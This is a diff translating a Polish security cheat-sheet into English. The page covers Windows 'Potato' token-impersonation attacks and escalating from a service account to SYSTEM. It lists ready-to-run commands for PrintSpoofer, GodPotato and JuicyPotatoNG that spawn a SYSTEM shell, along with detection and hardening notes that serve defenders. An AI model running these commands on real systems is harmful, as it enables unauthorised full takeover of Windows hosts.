@@ -12,40 +12,40 @@ author: "core"
 # Token Impersonation (Potato attacks)
 
 ## TL;DR
-Konto usługowe z `SeImpersonatePrivilege` (np. IIS, MSSQL) może wymusić uwierzytelnienie SYSTEM i podszyć się pod jego token → eskalacja do SYSTEM.
+A service account with `SeImpersonatePrivilege` (e.g. IIS, MSSQL) can coerce a SYSTEM authentication and impersonate its token → escalation to SYSTEM.
 
-## Warunek
+## Prerequisite
 ```powershell
 whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
 ```
 
-## Narzędzia (wybór wg wersji/kontekstu)
+## Tools (pick by version/context)
 ```powershell
-# PrintSpoofer – gdy działa spooler / named pipe
+# PrintSpoofer – when the spooler / named pipe is available
 .\PrintSpoofer64.exe -i -c cmd
 
-# GodPotato – nowoczesny, szeroka kompatybilność (.NET)
+# GodPotato – modern, broad compatibility (.NET)
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 
 # JuicyPotatoNG – DCOM/OXID
 .\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
 ```
 
-## Jak to działa (skrót)
-1. Wymuszenie uwierzytelnienia SYSTEM (RPC/DCOM/named pipe).
-2. Przechwycenie i impersonacja tokenu SYSTEM (`SeImpersonatePrivilege`).
-3. Uruchomienie procesu w kontekście SYSTEM.
+## How it works (short version)
+1. Coerce a SYSTEM authentication (RPC/DCOM/named pipe).
+2. Capture and impersonate the SYSTEM token (`SeImpersonatePrivilege`).
+3. Run a process in the SYSTEM context.
 
-## Wykrywanie (Blue Team)
-- Named pipe impersonation, proces potomny konta usługowego działający jako SYSTEM.
-- Sysmon Event 1 z nietypowym parent→child (`w3wp.exe` → `cmd.exe` jako SYSTEM).
-- Anomalie DCOM/OXID resolver.
+## Detection (Blue Team)
+- Named pipe impersonation, a child process of a service account running as SYSTEM.
+- Sysmon Event 1 with an unusual parent→child (`w3wp.exe` → `cmd.exe` as SYSTEM).
+- DCOM/OXID resolver anomalies.
 
-## Mitygacja / Hardening
-- Odbierz `SeImpersonatePrivilege` tam, gdzie zbędne (uważnie — usługi go wymagają).
-- Patching (część wektorów łatana), wyłącz nieużywany Spooler.
-- Segreguj konta usługowe, gMSA, monitoring EDR.
+## Mitigation / Hardening
+- Remove `SeImpersonatePrivilege` where unneeded (carefully — services require it).
+- Patching (some vectors are patched), disable the unused Spooler.
+- Segregate service accounts, gMSA, EDR monitoring.
 
-## Źródła
+## Sources
 - [GodPotato](https://github.com/BeichenDream/GodPotato)
 - [MITRE T1134.001](https://attack.mitre.org/techniques/T1134/001/)
